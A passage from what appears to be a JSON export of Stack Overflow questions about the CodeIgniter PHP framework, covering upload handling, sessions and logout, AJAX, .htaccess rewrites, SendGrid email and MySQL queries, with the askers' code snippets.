suggest writing the entire OR part of the query inside a single <code>where()</code>.</p>\n\n<p><strong>EDIT:</strong> Basically I want the implementation of the following simple query:</p>\n\n<pre><code>SELECT * FROM `table` WHERE field1='value1' AND (field2='value2' OR field3='value3') \n</code></pre>\n"},{"tags":["html","css","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12653147,"title":"Unable to load css file in codeigniter","body":"<p>I am new to codeigniter and trying to learn it but i am unable to load or use my css stylesheet for layout. The method i followed to load CSS file is what i found on internet but it did not worked. Please suggest something. </p>\n\n<p><strong>Here is my code</strong>:</p>\n\n<pre><code>&lt;html&gt;\n\n&lt;head&gt;\n&lt;title&gt;homePage&lt;/title&gt;\n\n &lt;!--[if lte IE 6]&gt;\n    &lt;style type=\"text/css\"&gt;\n    img, div { behavior: url(http('&lt;?php echo $base_url; ?&gt;images') }\n    &lt;/style&gt;\n&lt;![endif]--&gt;\n\n\n&lt;!--[IF lte IE 6]&gt;\n\n&lt;link rel=\"stylesheet\" href=\"&lt;?php echo $base_url; ?&gt;/css/homestyle.css\" type=\"text/css\" /&gt;\n\n&lt;![endif]--&gt;\n&lt;/head&gt;\n\n &lt;body &gt;\n\n\n &lt;div id=\"page\"&gt;\n &lt;div id=\"menulinks\"&gt;\n    &lt;a class=\"active\" href=\"#\"&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;\n    &lt;a href=\"#\"&gt;&lt;span&gt;Services&lt;/span&gt;&lt;/a&gt;\n    &lt;a href=\"#\"&gt;&lt;span&gt;About Us&lt;/span&gt;&lt;/a&gt;\n    &lt;a href=\"#\"&gt;&lt;span&gt;Contact Us&lt;/span&gt;&lt;/a&gt;\n&lt;/div&gt;\n&lt;div id=\"header\"&gt;\n\n&lt;/div&gt;\n          &lt;div class=\"active\" id=\"contentarea\"&gt;\n  &lt;br&gt;\n &lt;br&gt; \n &lt;/div&gt;\n\n &lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12664271,"title":"Logout not working on Second user on live site","body":"<p>So here's the scenario, </p>\n\n<p>The first user logged in and logged out successfully on the system.\nOn the same browser after first user logged out, the second user logged in.\nHowever when the second user clicked the log out button the system didn't flash the message that he's already logged out and when he tried to click the back button, it went back to the previous page which wasn't supposed to do, because he'd already clicked the 'log out' button.</p>\n\n<p>The log out function works perfectly on my localhost but not on the live site. </p>\n\n<p>The code is just like this</p>\n\n<pre><code>public function logout(){\n\n        $this-&gt;session-&gt;unset_userdata('user_id');\n        $this-&gt;session-&gt;sess_destroy();\n        $this-&gt;session-&gt;set_flashdata('error','You have been logged out!');\n        redirect('clogin/authenticate','refresh');}\n</code></pre>\n\n<p>I've already googled about the config session variables and tried to manipulate but it still doesn't work.\nI've also tried tried to implement this: </p>\n\n<pre><code>        $this-&gt;output-&gt;set_header('Last-Modified: ' . gmdate(\"D, d M Y H:i:s\") . ' GMT');\n        $this-&gt;output-&gt;set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');\n        $this-&gt;output-&gt;set_header('Pragma: no-cache');\n        $this-&gt;output-&gt;set_header(\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\");*/\n</code></pre>\n\n<p>but it still doesn't work.</p>\n\n<p>When I close the browser and open again the site it just doing the same thing, (first user is ok, and second is not). Is it the code, the website, the configuration or the browser ? How do you think this can be solve?</p>\n"},{"tags":["codeigniter","packages","helpers","hmvc","extending"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12660291,"title":"Can I extend the core helpers within a package in Code Igniter?","body":"<p>I'm building my own base to use on multiple sites that I will be building. And I've made a package for that. But I want to extend the CI helpers in that package (not in the app) - helpers such as <code>url_helper</code>, <code>html_helper</code> etc.</p>\n\n<p>I've put a config folder (although I don't really understant what it does) in the package folder and a config file in it (so structure is <code>packages/app_package/config/config.php</code>).</p>\n\n<p>I've put the <code>$config['subclass_prefix'] = 'app_';</code> (different from the application one preferably) and still not loading the helpers <code>app_url_helper</code> etc</p>\n\n<p>Did anybody do that?</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12658970,"title":"PHP Codeigniter Uploading Class, rename files with specific schema","body":"<p>I am having a spot of trouble with Codeigniter and getting files to rename within the upload process from the Upload Library it has to offer. Now before anyone says it, I am not looking for \"encrypted\" file names.</p>\n\n<p>My Problem is in uploading images you have a good handful of types you could be dealing with. So how does one change the file name using the <code>file_name</code> config option to a specific schema (which I already have the schema part up and working). But maintain the same file type?</p>\n\n<p>Right now I am attempting</p>\n\n<p><code>$upload_config['file_name'] = $generated_filename_from_schema</code></p>\n\n<p>Only problem is <code>$generated_filename_from_schema</code> doesnt have a file extension, and leaving the file extension out of the equation CI seems to ignore it altogether and just takes the file and append_1, _2, _3 as it goes up if the files have the same name, otherwise it just leaves the name intact. </p>\n\n<p>Now I have to pass the <code>$config</code> to CI so it will upload the file, but how can I determin what kind of file I am working with before it trys to upload so I can use my name generation schema. </p>\n\n<p>*<strong><em>edit</em>*</strong></p>\n\n<pre><code>    $upload_config['upload_path'] = realpath(APPPATH.'../images/');\n    $upload_config['allowed_types'] = 'gif|jpg|png';\n    $upload_config['max_size']  = 0;\n    $upload_config['max_width'] = 0;\n    $upload_config['max_height'] = 0;\n    $upload_config['remove_spaces'] = true;\n\n    $upload_config['file_name'] = $this-&gt;genfunc-&gt;genFileName($uid);\n\n    if($this-&gt;input-&gt;post('uploads'))\n    {\n\n        $this-&gt;load-&gt;library('upload');\n        $this-&gt;upload-&gt;initialize($upload_config);\n\n        if (!$this-&gt;upload-&gt;do_upload())\n        {\n            //echo 'error';\n            echo $config['upload_path'];\n            $this-&gt;data['errors'] = $this-&gt;upload-&gt;display_errors();\n        }\n        else\n        {\n            //echo 'uploaded';\n            $this-&gt;data['upload_data'] = $this-&gt;upload-&gt;data();\n        }\n    }\n</code></pre>\n"},{"tags":["jquery","mysql","ajax","codeigniter","jquery-ajax"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":274,"score":-1,"question_id":7936696,"title":"CodeIgniter Ajax does not return MySQL data","body":"<p>Basically, I have a string of functions that load a set of blog entries to build the page. At the bottom of the page I have a link that initiates a jQuery Ajax to an Ajax controller that uses the exact same string of functions to load more blog entries with a different offset.</p>\n\n<p>I have two queries initially in one of the functions. One that counts how many rows exist total, and the main function that returns the data for 10 or less rows called. I'm getting all of the data, except for the main blog entry data.</p>\n\n<p>Here's most of the code, I cut out everything else in the functions that isn't relevant:</p>\n\n<h3>Main view controller</h3>\n\n<pre><code>public function blog() {\n    $this-&gt;load-&gt;helper('date');\n    $this-&gt;load-&gt;model('blog_model');\n\n    $result = $this-&gt;blog_model-&gt;process_uri(0);\n    $this-&gt;load-&gt;view($result['view'],$result);\n}\n</code></pre>\n\n<h3>Ajax controller</h3>\n\n<pre><code>public function blog_data() {\n    $this-&gt;load-&gt;helper('date');\n    $this-&gt;load-&gt;model('blog_model');\n\n    //$offset = $this-&gt;input-&gt;post('offset');\n    $data = $this-&gt;blog_model-&gt;process_uri(0);\n    echo json_encode($data);\n}\n</code></pre>\n\n<h3>Model</h3>\n\n<pre><code>public function process_uri($offset) {\n    $result;\n    $uri = $this-&gt;uri;\n\n    // There's more this function, but I cut it out.\n    $result = array('type' =&gt; 'list');\n\n    return $this-&gt;blog_model-&gt;get_blog_data($result,$offset);\n}\n</code></pre>\n\n<h3>Where I think the problem lies</h3>\n\n<pre><code>private function get_blog_data($data,$offset) {\n    $return = array('type' =&gt; $data['type']);\n    $limit;\n    $select;\n\n    if (false) {\n    }\n    else {\n        $return['view'] = 'blog_view';\n\n        $this-&gt;db-&gt;select('id');\n        $r = $this-&gt;db-&gt;get('blog');\n        $return['total'] = $r-&gt;num_rows() - ($offset + 10);\n        $return['current'] = $offset + 10; // This returns\n\n        $limit = 10;\n        $select = 'blog.id,title,type,date,message,images';\n        $this-&gt;db-&gt;order_by('blog.id','desc');\n        if (isset($data['date'])) $this-&gt;db-&gt;like('date',$data['date'],'after');\n    }\n\n    $this-&gt;db-&gt;select($select);\n    $this-&gt;db-&gt;from('blog');\n    $this-&gt;db-&gt;join('blog_img','blog_img.id = blog.id','left');\n    $this-&gt;db-&gt;limit($limit,$offset);\n\n    // This does not return any data in the Ajax call.\n    $return['entries'] = $this-&gt;blog_model-&gt;process_data($this-&gt;db-&gt;get());\n\n    return $return;\n}\n\nprivate function process_data($data) {\n    foreach($data-&gt;result() as $i =&gt; $row) {\n        //Formats the data\n    }\n}\n</code></pre>\n\n<p>The return data I get in JavaScript is:</p>\n\n<pre><code>{\"type\":\"list\",\"view\":\"blog_view\",\"total\":5,\"current\":10,\"entries\":[]}\n</code></pre>\n\n<p>As you can see, even if I pass identical data through the Ajax controller, the entries array is still empty. I'm not too familiar with <a href=\"http://en.wikipedia.org/wiki/Codeigniter#CodeIgniter\" rel=\"nofollow\">CodeIgniter</a>, and especially using Ajax with it, so I would greatly appreciate if anyone could help with this, as it's really killing me.</p>\n\n<p>Also, I know the problem is not in the JavaScript code, because I tried adding some static data in the process_data function to see if it would show up and it does, hence that is the reason why I didn't add the JavaScript code.</p>\n"},{"tags":["oop","mvc","codeigniter","user-experience"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":123,"score":0,"question_id":12629365,"title":"CodeIgniter and the Model-View-Controller – your experience / your meaning?","body":"<p>I have a “simple” question about the principle from the CodeIgniter MVC. \nIf I take a look in the manual from CI (Models) I see for example this:</p>\n\n<pre><code>function insert_entry()\n{\n    $this-&gt;title   = $_POST['title']; // please read the below note\n    $this-&gt;content = $_POST['content'];\n    $this-&gt;date    = time();\n    $this-&gt;db-&gt;insert('entries', $this);\n}\n</code></pre>\n\n<p>Well, ok – to put in data this way is bad I know :) but also if we user “$this->input->post()” … for me it doesn’t look better. Isn’t it better to handle the data in the controller before I use a function from  a model? Maybe the model part looks so:</p>\n\n<pre><code>function insert_entry($data)\n{\n    $this-&gt;db-&gt;insert('entries', $data);\n}\n</code></pre>\n\n<p>And in the controller such like this:</p>\n\n<pre><code>$this-&gt;load-&gt;model('Blog');\n$data = array();\n$data['title'] = $this-&gt;input-&gt;post('title');\n$data['content'] = $this-&gt;input-&gt;post('content');\n$this-&gt;Blog-&gt;insert_entry($data);\n</code></pre>\n\n<p>But where i run the validation etc. … model or controller?\nMaybe someone understand what I would like to know. Maybe you have some more experience, links or whatever. Thanks!</p>\n"},{"tags":["ajax","codeigniter","server-side","crm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12662527,"title":"How to send data to client browsers when a server side change occurs","body":"<p>I have an intranet based CRM application developed in CodeIgniter 2.1 where the application is running on a local Apache server and around 20 clients are accessing it over LAN. This is to be connected to a call center setup where the call center application (running on a separate server) will do a HTTP post with caller's number as well as terminal number of the agent where the call is arriving to a URL of my Codeigniter application. I am using this data to populate a database table of call records.</p>\n\n<p>Now from the terminal number (each terminal has static IP, and a session in Codeigniter is linked to IP as well) I can find out which user (login session) of my application is about to receive the call. <strong>I want to find a way out how I can send data from server side</strong> (it will be regarding the call like the number who is calling, past call records etc.) <strong>to that specific user's browser</strong> via AJAX or something similar? The agent's browser needs to display this information sent from server.\nPeriodic polling from browser by jquery etc. is not possible as the data needs to be updated almost instantaneously and rapid polling up to this extent will lead to high CPU usage at client end as well as extra load on network.</p>\n\n<p>P.S.: I only want to know how to modify the browser data from server end.</p>\n"},{"tags":["php","codeigniter","email","html-email","sendgrid"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12661270,"title":"sendgrid email send via codeigniter is received as spam","body":"<p>I am using Codeigniter and SendGrid for send my emails to the users...</p>\n\n<p>I have a template for each email i send and for registration it looks like this:</p>\n\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n    &lt;h1&gt;Activate account for &lt;?php echo $identity;?&gt;&lt;/h1&gt;\n    &lt;p&gt;Please click this link to &lt;?php echo anchor('auth/activate/'. $id .'/'. $activation, 'Activate Your Account');?&gt;.&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I use a <strong>from</strong> <code>email address</code> that doesn't exist like <code>no-reply@domain.com</code></p>\n\n<p>The problem is that the email is received as spam which i want to fix... could it be because of the fake <strong>from</strong> email address?</p>\n\n<p>I guess the HTML is fine</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12660595,"title":"Codeigniter 2.1 - Combining $data from the __construct and called function","body":"<p>I have several <strong>$data</strong> which are called in almost all functions in controller. Is there a way to create this <strong>$data</strong> in <strong>__construct</strong> function and combine them with <strong>$data</strong> in called function? Example:</p>\n\n<pre><code>function __construct() {\n        parent::__construct();\n\n        $this-&gt;load-&gt;model('ad_model', 'mgl');\n        $this-&gt;load-&gt;model('global_info_model', 'gi');\n        $this-&gt;load-&gt;model('user_model', 'um');        \n        $this-&gt;load-&gt;library('global_functions');\n        $this-&gt;css = \"&lt;link rel=\\\"stylesheet\\\" href=\\\" \" . CSS . \"mali_oglasi.css\\\"&gt;\";\n        $this-&gt;gi_cat = $this-&gt;gi-&gt;gi_get_category();\n        $this-&gt;gi_loc = $this-&gt;gi-&gt;gi_get_location();        \n        $this-&gt;gi_type = $this-&gt;gi-&gt;gi_get_type();       \n        }\n\n    function index() {     \n        $count = $this-&gt;db-&gt;count_all('ad');        \n        $data['pagination_links'] = $this-&gt;global_functions-&gt;global_pagination('mali_oglasi', $count, 2);\n\n        $data['title'] = \"Mali Oglasi | 010\";\n        $data['oglasi'] =  $this-&gt;mgl-&gt;mgl_get_all_home(10);\n        $data['loc'] = $this-&gt;gi_loc;\n        $data['cat'] = $this-&gt;gi_cat;\n        $data['stylesheet'] = $this-&gt;css;\n        $data['main_content'] = 'mali_oglasi';\n\n    $this-&gt;load-&gt;view('template',$data);\n    }\n</code></pre>\n\n<p>If I want to put <strong>$data['loc']</strong>, <strong>$data['cat']</strong> and <strong>$data['stylesheet']</strong> in <strong>__construct</strong> I will have to call <strong>$this->data</strong> in <strong>$this->load->view('template',$data);</strong></p>\n\n<p>Is there a way to combine this two?</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12278652,"title":".htaccess multiple rewrite rules for codeigniter","body":"<p>I want to ask how can we add an additional rewrite rule(s) in .htaccess file including the index.php removal rule in codeigniter.</p>\n\n<p>Here is my .htaccess file</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^profile/([0-9]+)$ /index.php/front/profileDetail/$1\nRewriteRule ^(.*)$ /index.php/$1\n</code></pre>\n\n<p>The problem is that, only one of the rule works at a time. If I save the file as shown above it returns internal server error!</p>\n\n<p>What I want is completely remove index.php file plus rewrite the url from  xyz.com/front/profileDetail/50 into xyz.com/profile/50</p>\n\n<p>Please help what's wrong, I am completely newbie in this regard.</p>\n\n<p>Thanks! in advance.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":12659185,"title":"mysql , codeigniter active record class","body":"<h3>table1</h3>\n\n<pre><code>house_id|house_name|status\n\n  1     |     A    |  1\n  2     |     B    |  1\n  3     |     C    |  0\n  4     |     D    |  1\n  5     |     E    |  1\n  6     |     F    |  1\n</code></pre>\n\n<h3>table1</h3>\n\n<pre><code>house_id| image\n\n   2    | img1.jpg\n   2    | img2.jpg\n   1    | img3.jpg\n   4    | img4.jpg\n   1    | img5.jpg\n   4    | img6.jpg\n   3    | img7.jpg\n</code></pre>\n\n<h3>I want select all house_id from table1  where status =1 (descending) , select distinct image from table2, for each house_id of table1 .</h3>\n\n<h3>Finally output show bellow :</h3>\n\n<h3>Output</h3>\n\n<pre><code>house_id|house_name|image\n\n   6    |    F     |NULL\n   5    |    E     |NULL\n   4    |    D     |img4.jpg\n   2    |    B     |img1.jpg  \n   1    |    A     |img3.jpg  \n</code></pre>\n\n<h3>please help me code with normal mysql or CI active record class method ..</h3>\n"},{"tags":["codeigniter","tankauth"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":788,"score":0,"question_id":5920393,"title":"Tank Auth forgot password does't work","body":"<p>I use CodeIgniter + Tank Auth. Only the code <a href=\"http://localhost/XXXXXXXX/auth/forgot_password\" rel=\"nofollow\">http://localhost/XXXXXXXX/auth/forgot_password</a> doesn't work.\nThe result always is:\n\"Your activation key is incorrect or expired. Please check your email again and follow the instructions.\"</p>\n\n<p>The registration and activation are all right.</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12656866,"title":"PHP Codeigniter uploads failing silently, no error log, no errors, nothing","body":"<p>I've almost taken this exactly as is from the CI docs, made some minor alterations to suit my needs but overall nothing significant. The folder I am attempting to upload to exists and has <code>777</code> set to its permissions.</p>\n\n<p>The controller:</p>\n\n<pre><code>    if($this-&gt;input-&gt;post('uploads'))\n    {\n        $config['upload_path'] = realpath(APPPATH.'../images');\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = 0;\n        $config['max_width']  = 0;\n        $config['max_height']  = 0;\n        $config['remove_spaces'] = true;\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if (!$this-&gt;upload-&gt;do_upload())\n        {\n            $data['errors'] = $this-&gt;upload-&gt;display_errors();\n        }\n        else\n        {\n            $data['upload_data'] = $this-&gt;upload-&gt;data();\n        }\n    }\n</code></pre>\n\n<p>The View:</p>\n\n<pre><code>&lt;?php\nif(isset($errors))\n{\n    $this-&gt;genfunc-&gt;debugArray($errors);\n}\nif(isset($upload_data))\n{\n     $this-&gt;genfunc-&gt;debugArray($upload_data, 'php');\n}\n?&gt;\n\n&lt;div id=\"gallery\"&gt;\n    &lt;?php if (isset($images) &amp;&amp; count($images)):\n        foreach($images as $image): ?&gt;\n        &lt;div class=\"thumb\"&gt;\n            &lt;a href=\"&lt;?php echo $image['url']; ?&gt;\"&gt;\n                &lt;img src=\"&lt;?php echo $image['thumb_url']; ?&gt;\" /&gt;\n            &lt;/a&gt;                \n        &lt;/div&gt;\n    &lt;?php endforeach; else: ?&gt;\n        &lt;div id=\"blank_gallery\"&gt;Please Upload an Image&lt;/div&gt;\n    &lt;?php endif; ?&gt;\n&lt;/div&gt;\n\n&lt;div id=\"upload\"&gt;\n    &lt;?php\n    echo form_open_multipart('upload');\n    echo form_upload('userfile');\n    echo form_submit('uploads', 'Upload');\n    echo form_close();\n    ?&gt;      \n&lt;/div&gt;\n</code></pre>\n\n<p>The view is loaded as well, everything currently gets sent back to the same page, which is expected. But having taken from the CI example in the Docs, and going over everything I see no reason why this shouldnt be working. Hoping someone can shed some light on it, maybe I am missing something?</p>\n"},{"tags":["php","codeigniter","session","localization","header"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":71,"score":-1,"question_id":12657066,"title":"\"Headers already sent\" on session set","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8028957/headers-already-sent-by-php\">Headers already sent by PHP</a>  </p>\n</blockquote>\n\n\n\n<p><strong>index.php</strong></p>\n\n<pre><code>&lt;?php\n\n/*\n *---------------------------------------------------------------\n * APPLICATION ENVIRONMENT\n *---------------------------------------------------------------\n *\n * You can load different configurations depending on your\n * current environment. Setting the environment also influences\n * things like logging and error reporting.\n *\n * This can be set to anything, but default usage is:\n *\n *     development\n *     testing\n *     production\n *\n * NOTE: If you change these, also change the error_reporting() code below\n *\n */\n    define('ENVIRONMENT', 'development');\n/*\n *---------------------------------------------------------------\n * ERROR REPORTING\n *---------------------------------------------------------------\n *\n * Different environments will require different levels of error reporting.\n * By default development will show errors but testing and live will hide them.\n */\n\nif (defined('ENVIRONMENT'))\n{\n    switch (ENVIRONMENT)\n    {\n        case 'development':\n            error_reporting(E_ALL);\n        break;\n\n        case 'testing':\n        case 'production':\n            error_reporting(0);\n        break;\n\n        default:\n            exit('The application environment is not set correctly.');\n    }\n}\n\n/*\n *---------------------------------------------------------------\n * SYSTEM FOLDER NAME\n *---------------------------------------------------------------\n *\n * This variable must contain the name of your \"system\" folder.\n * Include the path if the folder is not in the same  directory\n * as this file.\n *\n */\n    $system_path = 'system';\n\n/*\n *---------------------------------------------------------------\n * APPLICATION FOLDER NAME\n *---------------------------------------------------------------\n *\n * If you want this front controller to use a different \"application\"\n * folder then the default one you can set its name here. The folder\n * can also be renamed or relocated anywhere on your server.  If\n * you do, use a full server path. For more info please see the user guide:\n * http://codeigniter.com/user_guide/general/managing_apps.html\n *\n * NO TRAILING SLASH!\n *\n */\n    $application_folder = 'application';\n\n/*\n * --------------------------------------------------------------------\n * DEFAULT CONTROLLER\n * --------------------------------------------------------------------\n *\n * Normally you will set your default controller in the routes.php file.\n * You can, however, force a custom routing by hard-coding a\n * specific controller class/function here.  For most applications, you\n * WILL NOT set your routing here, but it's an option for those\n * special instances where you might want to override the standard\n * routing in a specific front controller that shares a common CI installation.\n *\n * IMPORTANT:  If you set the routing here, NO OTHER controller will be\n * callable. In essence, this preference limits your application to ONE\n * specific controller.  Leave the function name blank if you need\n * to call functions dynamically via the URI.\n *\n * Un-comment the $routing array below to use this feature\n *\n */\n    // The directory name, relative to the \"controllers\" folder.  Leave blank\n    // if your controller is not in a sub-folder within the \"controllers\" folder\n    // $routing['directory'] = '';\n\n    // The controller class file name.  Example:  Mycontroller\n    // $routing['controller'] = '';\n\n    // The controller function you wish to be called.\n    // $routing['function'] = '';\n\n\n/*\n * -------------------------------------------------------------------\n *  CUSTOM CONFIG VALUES\n * -------------------------------------------------------------------\n *\n * The $assign_to_config array below will be passed dynamically to the\n * config class when initialized. This allows you to set custom config\n * items or override any default config values found in the config.php file.\n * This can be handy as it permits you to share one application between\n * multiple front controller files, with each file containing different\n * config values.\n *\n * Un-comment the $assign_to_config array below to use this feature\n *\n */\n    // $assign_to_config['name_of_config_item'] = 'value of config item';\n\n\n\n// --------------------------------------------------------------------\n// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE\n// --------------------------------------------------------------------\n\n/*\n * ---------------------------------------------------------------\n *  Resolve the system path for increased reliability\n * ---------------------------------------------------------------\n */\n\n    // Set the current directory correctly for CLI requests\n    if (defined('STDIN'))\n    {\n        chdir(dirname(__FILE__));\n    }\n\n    if (realpath($system_path) !== FALSE)\n    {\n        $system_path = realpath($system_path).'/';\n    }\n\n    // ensure there's a trailing slash\n    $system_path = rtrim($system_path, '/').'/';\n\n    // Is the system path correct?\n    if ( ! is_dir($system_path))\n    {\n        exit(\"Your system folder path does not appear to be set correctly. Please open the following file and correct this: \".pathinfo(__FILE__, PATHINFO_BASENAME));\n    }\n\n/*\n * -------------------------------------------------------------------\n *  Now that we know the path, set the main path constants\n * -------------------------------------------------------------------\n */\n    // The name of THIS file\n    define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));\n\n    // The PHP file extension\n    // this global constant is deprecated.\n    define('EXT', '.php');\n\n    // Path to the system folder\n    define('BASEPATH', str_replace(\"\\\\\", \"/\", $system_path));\n\n    // Path to the front controller (this file)\n    define('FCPATH', str_replace(SELF, '', __FILE__));\n\n    // Name of the \"system folder\"\n    define('SYSDIR', trim(strrchr(trim(BASEPATH, '/'), '/'), '/'));\n\n\n    // The path to the \"application\" folder\n    if (is_dir($application_folder))\n    {\n        define('APPPATH', $application_folder.'/');\n    }\n    else\n    {\n        if ( ! is_dir(BASEPATH.$application_folder.'/'))\n        {\n            exit(\"Your application folder path does not appear to be set correctly. Please open the following file and correct this: \".SELF);\n        }\n\n        define('APPPATH', BASEPATH.$application_folder.'/');\n    }\n\n/*\n * --------------------------------------------------------------------\n * LOAD THE BOOTSTRAP FILE\n * --------------------------------------------------------------------\n *\n * And away we go...\n *\n */\nrequire_once BASEPATH.'core/CodeIgniter.php';\n\n$ci=&amp; get_instance();\n\n$ci-&gt;load-&gt;model(\"language_model\");\n$ci-&gt;language_model-&gt;setLanguage();\n\n//init s3 stuff\n//instantiate the class\n\n/*$ci=&amp; get_instance();\nif ($ci-&gt;uri-&gt;segment(1) == 'add_referee'){\n\n    $ci-&gt;s3-&gt;putBucket($ci-&gt;config-&gt;item(\"bucket\"), S3::ACL_PUBLIC_READ);\n}*/\n\n/* End of file index.php */\n/* Location: ./index.php */\n</code></pre>\n\n<p><strong>model called in the end of index.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('');\n\nclass language_model extends CI_Model {\n\n    function __construct(){\n        parent::__construct();\n    }\n\n    function allowedLanguages(){\n        $data = array(\n            'en',\n            'de'\n        );\n\n        return $data;\n    }\n\nfunction setLanguage(){\n    $uri_lang = trim($this-&gt;input-&gt;get(\"lang\"));\n\n    if ($uri_lang != ''){\n        if (in_array($uri, $this-&gt;allowedLanguages())){\n            $this-&gt;session-&gt;set_userdata('locale', $uri_lang);\n        }else{\n            $this-&gt;session-&gt;set_userdata('locale', 'en');\n        }\n    }else{\n        $this-&gt;session-&gt;set_userdata('locale', 'en');\n    }\n\n}\n\n}\n</code></pre>\n\n<p>So basically I am trying to set the language the user has selected into a session and use it to serve the website to the user language but I am getting</p>\n\n<blockquote>\n  <p>Message: Cannot modify header information - headers already sent</p>\n</blockquote>\n"},{"tags":["apache","codeigniter","permissions","webserver","amfphp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":10753534,"title":"Codeigniter AMFPHP not working on live","body":"<p>I am developing a php flash based application and following <a href=\"https://code.google.com/p/codeigniter203amfphp20/\" rel=\"nofollow\">this tutorial</a>.</p>\n\n<p>every thing is working fine on my <code>localhost</code> PC but, not on live server CentOS.</p>\n\n<p>This tutorial guides to keep the amfphp library in <code>librarires</code> directory under application and create a controller '<code>gateway</code>' in <code>controllers/amf</code> and controllers as services into <code>controllers/amf/services</code>.</p>\n\n<p>I have followed that properly and with that I am able to run it smoothly on localhost. Also, removing the sub directory <code>amf</code> is also working just fine</p>\n\n<p>At live it gives </p>\n\n<pre><code>Error #2044: Unhandled NetStatusEvent:. level=error, code=NetConnection.Call.BadVersion\n    at amfphpconnection_fla::MainTimeline/frame1()\n</code></pre>\n\n<p>The connection from AS needs to be </p>\n\n<pre><code>http://domain.com/index.php/amf/gateway\n</code></pre>\n\n<p>I was trying different tricks to make it work and I found that if I kept the services from /controller/services/serices folder into application/libraries where amf itself resides and change the path to services in gateway then flash was able to reach the file when i changed the path in flash to </p>\n\n<pre><code>http://domain.com/application/libraries/Amfphp/\n</code></pre>\n\n<p>but, it still was not running properly until i removed the <code>extends CI_Controller</code> and <code>constructor function</code> or <code>get_instance()</code> from the service file. putting either raised the same error. this just runs the file but is useless for me because its not able to use CI framework then.</p>\n\n<p>Using the controller path in the AS is what is required and <strong>i think this is something related to file access permission</strong> because its working fine on pc and not on linux.</p>\n\n<p>I tried to look into <strong>Apache error logs</strong> too but no signs of any possible error out there. </p>\n\n<p>Have looked loads of sites for help but no success as yet..</p>\n\n<p>also posted bug at the <a href=\"https://code.google.com/p/codeigniter203amfphp20/issues/detail?id=4\" rel=\"nofollow\">project site</a> itself but no updates are their as yet</p>\n\n<p>any help would be appreciated</p>\n\n<p>Regards</p>\n"},{"tags":["php","mysql",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12656796,"title":"URL string does not return in MySQL query","body":"<p>I try to query a series of rows in my MySQL database but whenever the value is a URL it does not display.</p>\n\n<pre><code>([Handle] =&gt; air-gap-parts \n [productID] =&gt; 0000000018 \n [active] =&gt; 1 \n [tag] =&gt; 0 \n [ImageSrc] =&gt;) \n</code></pre>\n\n<p>ImageSrc should yield a URL to a picture but every time it returns nothing. I'm using CodeIgniter and I am wondering if it has something to do with my .htaccess file?</p>\n\n<p>.htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L] \n\n&lt;Files \"index.php\"&gt;\n  AcceptPathInfo On\n&lt;/Files&gt;\n</code></pre>\n\n<p>CodeIgniter Model Query:</p>\n\n<pre><code>function get_product_pics($handle)&lt;br /&gt;\n{\n  $this-&gt;db-&gt;where('handle', $handle);\n  $query = $this-&gt;db-&gt;get('products_test_db');\n  return $query-&gt;result();\n}\n</code></pre>\n\n<p>Thank you very much for your help!</p>\n"},{"tags":["mysql","codeigniter","database-design","phpmyadmin","tinymce"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":103,"score":1,"question_id":12648805,"title":"How to set up a MySQL database effectively for large text and html fields","body":"<p>on my website I will be allowing users to insert text into multiple WYSIWYG(TinyMCE) text fields. Each field has a title which will be used for navigation and for general identification.</p>\n\n<p><strong>Whats being entered into the database:</strong>\nMultiple: text from input (max 255 char)\nMultiple: HTML/text from 